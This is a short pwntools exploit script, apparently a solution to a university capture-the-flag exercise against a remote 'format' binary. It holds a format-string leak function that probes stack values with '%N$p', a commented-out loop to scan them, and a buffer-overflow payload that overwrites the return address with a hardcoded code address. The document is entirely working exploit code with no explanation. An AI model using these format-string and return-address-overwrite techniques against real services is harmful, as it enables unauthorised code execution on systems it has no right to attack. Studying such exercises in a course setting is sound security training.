from pwn import *

bpath = "./format"
elf = ELF(bpath)
context.binary = elf
context.log_level = 'debug'


def leak(param_num):
    c = remote('cs4401shell.walls.ninja',50203)
    c.recvline()
    c.sendline(f"%{param_num}$p")
    leak_raw = c.recvline().strip()
    leak_value = int(leak_raw, 16)
    c.sendline(b'_')
    c.sendline(b'_')
    c.wait()
    return leak_value


#for i in range(0,16):
#    try:
#        with context.silent:
#            leak_val = leak(i)
#        log.info(f"Value leaked at param {i}: {hex(leak_val)}")
#    except Exception as e:
#        log.info(f"Failed to leak value for param num {i}")
#        print(e)


c = remote('cs4401shell.walls.ninja',50203)
c.recvline()
c.sendline(b'a')
c.sendline(b'a'*24+p64(0x00005555555548fa))
c.recvall()
c.wait()
